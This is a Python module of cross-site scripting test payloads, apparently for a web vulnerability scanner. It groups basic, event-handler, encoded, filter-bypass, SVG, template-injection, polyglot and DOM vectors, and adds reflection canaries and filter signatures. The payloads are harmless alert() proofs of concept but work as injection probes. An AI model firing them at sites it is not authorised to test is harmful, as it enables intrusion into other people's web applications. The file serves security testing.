"""
XSS (Cross-Site Scripting) Payloads

Comprehensive collection of XSS test payloads including
reflected, stored, and DOM-based XSS vectors.
"""

# Basic XSS payloads
BASIC_XSS = [
    "<script>alert('XSS')</script>",
    "<script>alert(1)</script>",
    "<script>alert(document.domain)</script>",
    "<script>alert(String.fromCharCode(88,83,83))</script>",
    "'><script>alert('XSS')</script>",
    '"><script>alert("XSS")</script>',
    "</title><script>alert('XSS')</script>",
    "</textarea><script>alert('XSS')</script>",
]

# Event handler XSS payloads
EVENT_XSS = [
    '<img src=x onerror=alert("XSS")>',
    "<img src=x onerror=alert(1)>",
    '<svg onload=alert("XSS")>',
    "<svg/onload=alert(1)>",
    '<body onload=alert("XSS")>',
    "<body onpageshow=alert(1)>",
    '<input onfocus=alert("XSS") autofocus>',
    '<input onblur=alert("XSS") autofocus><input autofocus>',
    '<marquee onstart=alert("XSS")>',
    '<video><source onerror=alert(1)>',
    '<audio src=x onerror=alert(1)>',
    '<details open ontoggle=alert(1)>',
    "<div onmouseover=alert(1)>hover me</div>",
    "<a onmouseover=alert(1)>click</a>",
    '<iframe onload=alert("XSS")>',
    "<object data=javascript:alert(1)>",
    "<embed src=javascript:alert(1)>",
]

# HTML attribute injection
ATTRIBUTE_XSS = [
    '" onmouseover="alert(1)',
    "' onmouseover='alert(1)",
    '" onfocus="alert(1)" autofocus="',
    "' onfocus='alert(1)' autofocus='",
    '" onload="alert(1)',
    "javascript:alert(1)",
    "javascript:alert('XSS')",
    "data:text/html,<script>alert(1)</script>",
    "vbscript:alert(1)",
]

# Encoded XSS payloads
ENCODED_XSS = [
    "%3Cscript%3Ealert(1)%3C/script%3E",  # URL encoded
    "%253Cscript%253Ealert(1)%253C/script%253E",  # Double URL encoded
    "&#60;script&#62;alert(1)&#60;/script&#62;",  # HTML entity decimal
    "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",  # HTML entity hex
    "\\x3Cscript\\x3Ealert(1)\\x3C/script\\x3E",  # Hex escape
    "\\u003Cscript\\u003Ealert(1)\\u003C/script\\u003E",  # Unicode escape
    "<scr<script>ipt>alert(1)</scr</script>ipt>",  # Nested/recursive
    "<scr\\x00ipt>alert(1)</scr\\x00ipt>",  # Null byte injection
]

# Filter bypass payloads
BYPASS_XSS = [
    "<ScRiPt>alert(1)</ScRiPt>",  # Mixed case
    "<script >alert(1)</script >",  # Space before >
    "<script\t>alert(1)</script>",  # Tab character
    "<script\n>alert(1)</script>",  # Newline
    "<script/>alert(1)</script>",  # Self-closing attempt
    "<<script>alert(1)//<</script>",  # Double tag
    "<img src=\"x\"onerror=\"alert(1)\">",  # No space before event
    "<img/src=x onerror=alert(1)>",  # Slash instead of space
    "<svg><script>alert&#40;1&#41;</script></svg>",  # Entity in script
    "<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>",  # MXSS
    "<!--<script>-->alert(1)<!--</script>-->",  # Comment trick
    '<script x>alert(1)</script x>',  # Invalid attribute
    '<a href="javascript&colon;alert(1)">click</a>',  # Entity in protocol
    '<script>\\u0061lert(1)</script>',  # Unicode in JS
]

# SVG-based XSS
SVG_XSS = [
    '<svg><script>alert(1)</script></svg>',
    '<svg onload=alert(1)>',
    '<svg><animate onbegin=alert(1) attributeName=x>',
    '<svg><set onbegin=alert(1) attributeName=x>',
    '<svg><handler xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load">alert(1)</handler></svg>',
    '<svg><foreignObject><iframe srcdoc="<script>alert(1)</script>"></foreignObject></svg>',
]

# Template injection (for frameworks like Angular, Vue, etc.)
TEMPLATE_INJECTION = [
    "{{constructor.constructor('alert(1)')()}}",  # Angular
    "${alert(1)}",  # Template literal
    "#{alert(1)}",  # Ruby ERB style
    "<%= alert(1) %>",  # EJS style
    "{{alert(1)}}",  # Mustache/Handlebars
    "[[${alert(1)}]]",  # Thymeleaf
    "*{alert(1)}",  # Thymeleaf
    "@{alert(1)}",  # Thymeleaf
    "~{alert(1)}",  # Thymeleaf
    "{{{alert(1)}}}",  # Mustache raw
    "{{= it.constructor.constructor('alert(1)')() }}",  # doT.js
]

# Polyglot XSS (multiple contexts)
POLYGLOT_XSS = [
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//",
    "'\"--></style></script><script>alert(1)</script>",
    "\">><marquee><img src=x onerror=confirm(1)></marquee>\"></plaintext\\></|\\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->\"></script><script>alert(1)</script>",
    "'-alert(1)-'",
    "'-alert(1)//",
]

# DOM XSS payloads (for testing DOM sinks)
DOM_XSS = [
    "#<script>alert(1)</script>",
    "#javascript:alert(1)",
    "javascript:alert(1)//",
    "#><img src=x onerror=alert(1)>",
]

# All XSS payloads combined
ALL_XSS_PAYLOADS = (
    BASIC_XSS +
    EVENT_XSS +
    ATTRIBUTE_XSS +
    ENCODED_XSS +
    BYPASS_XSS +
    SVG_XSS +
    TEMPLATE_INJECTION +
    POLYGLOT_XSS
)

# Canary values for detecting reflection
XSS_CANARIES = [
    "xss_test_canary_12345",
    "<xss_canary>",
    "'xss'canary'",
    '"xss"canary"',
    "xss`canary`",
]

# Patterns that indicate XSS protection or filtering
XSS_FILTER_SIGNATURES = [
    "xss detected",
    "cross-site scripting",
    "malicious content",
    "invalid input",
    "security violation",
    "blocked",
    "forbidden",
]
